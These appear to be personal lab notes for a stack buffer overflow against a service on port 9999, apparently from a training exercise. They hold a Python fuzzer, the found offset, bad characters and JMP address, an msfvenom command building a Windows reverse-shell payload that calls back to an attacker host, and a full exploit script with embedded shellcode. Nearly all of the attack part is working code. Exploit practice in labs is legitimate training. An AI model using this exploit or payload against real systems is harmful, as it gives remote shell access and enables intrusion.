## port 9999
interaction with the binary 

![[Pasted image 20210531151217.png]]

# bof

## fuzzing 

crashed at 700 bytes

![[Pasted image 20210531152205.png]]

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.1.108"

port = 9999
timeout = 5
prefix = ""

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      #s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string + "\r\n", "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

## offset

EIP: 35724134

offset: 524

![[Pasted image 20210531152457.png]]

![[Pasted image 20210531152552.png]]

## bad chars

ESP: 005FF910

![[Pasted image 20210531153336.png]]

bad chars: `\x00`

## jmp point

311712F3

little endian 

`\xf3\x12\x17\x31`

![[Pasted image 20210531153530.png]]

## exploit 

`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"`

![[Pasted image 20210531154717.png]]

```python
import socket

ip = "10.10.48.192"
port = 9999

prefix = ""
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
payload = (
"\xdb\xdc\xd9\x74\x24\xf4\xba\xc7\x11\x57\x7f\x5e\x29\xc9\xb1"
"\x52\x31\x56\x17\x83\xc6\x04\x03\x91\x02\xb5\x8a\xe1\xcd\xbb"
"\x75\x19\x0e\xdc\xfc\xfc\x3f\xdc\x9b\x75\x6f\xec\xe8\xdb\x9c"
"\x87\xbd\xcf\x17\xe5\x69\xe0\x90\x40\x4c\xcf\x21\xf8\xac\x4e"
"\xa2\x03\xe1\xb0\x9b\xcb\xf4\xb1\xdc\x36\xf4\xe3\xb5\x3d\xab"
"\x13\xb1\x08\x70\x98\x89\x9d\xf0\x7d\x59\x9f\xd1\xd0\xd1\xc6"
"\xf1\xd3\x36\x73\xb8\xcb\x5b\xbe\x72\x60\xaf\x34\x85\xa0\xe1"
"\xb5\x2a\x8d\xcd\x47\x32\xca\xea\xb7\x41\x22\x09\x45\x52\xf1"
"\x73\x91\xd7\xe1\xd4\x52\x4f\xcd\xe5\xb7\x16\x86\xea\x7c\x5c"
"\xc0\xee\x83\xb1\x7b\x0a\x0f\x34\xab\x9a\x4b\x13\x6f\xc6\x08"
"\x3a\x36\xa2\xff\x43\x28\x0d\x5f\xe6\x23\xa0\xb4\x9b\x6e\xad"
"\x79\x96\x90\x2d\x16\xa1\xe3\x1f\xb9\x19\x6b\x2c\x32\x84\x6c"
"\x53\x69\x70\xe2\xaa\x92\x81\x2b\x69\xc6\xd1\x43\x58\x67\xba"
"\x93\x65\xb2\x6d\xc3\xc9\x6d\xce\xb3\xa9\xdd\xa6\xd9\x25\x01"
"\xd6\xe2\xef\x2a\x7d\x19\x78\x5f\x93\x25\xa8\x37\x91\x25\x6b"
"\xe1\x1c\xc3\x01\xe1\x48\x5c\xbe\x98\xd0\x16\x5f\x64\xcf\x53"
"\x5f\xee\xfc\xa4\x2e\x07\x88\xb6\xc7\xe7\xc7\xe4\x4e\xf7\xfd"
"\x80\x0d\x6a\x9a\x50\x5b\x97\x35\x07\x0c\x69\x4c\xcd\xa0\xd0"
"\xe6\xf3\x38\x84\xc1\xb7\xe6\x75\xcf\x36\x6a\xc1\xeb\x28\xb2"
"\xca\xb7\x1c\x6a\x9d\x61\xca\xcc\x77\xc0\xa4\x86\x24\x8a\x20"
"\x5e\x07\x0d\x36\x5f\x42\xfb\xd6\xee\x3b\xba\xe9\xdf\xab\x4a"
"\x92\x3d\x4c\xb4\x49\x86\x6c\x57\x5b\xf3\x04\xce\x0e\xbe\x48"
"\xf1\xe5\xfd\x74\x72\x0f\x7e\x83\x6a\x7a\x7b\xcf\x2c\x97\xf1"
"\x40\xd9\x97\xa6\x61\xc8"
)

postfix = ""

buffer = prefix + overflow + retn + padding + payload  + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```